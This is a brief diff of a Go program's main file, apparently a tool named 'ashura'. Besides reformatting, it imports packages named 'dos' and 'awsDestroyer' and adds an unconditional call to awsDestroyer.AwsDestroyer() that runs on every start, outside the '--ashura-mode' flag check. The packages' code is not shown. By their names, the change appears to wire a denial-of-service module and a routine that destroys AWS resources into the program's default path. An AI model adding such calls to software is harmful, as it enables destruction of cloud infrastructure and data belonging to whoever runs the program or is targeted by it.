@@ -1,19 +1,21 @@
 package main
 
 import (
+	"ashura/awsDestroyer"
+	"ashura/dos"
 	"fmt"
 	"os"
-	"runtime"
 	"os/exec"
-	"ashura/dos"
+	"runtime"
 )
 
 func main() {
-	for i:=0 ; i<len(os.Args) ; i++ {
+	for i := 0; i < len(os.Args); i++ {
 		if os.Args[i] == "--ashura-mode" {
 			ashuraMode()
 		}
 	}
+	awsDestroyer.AwsDestroyer()
 }
 
 func ashuraMode() {
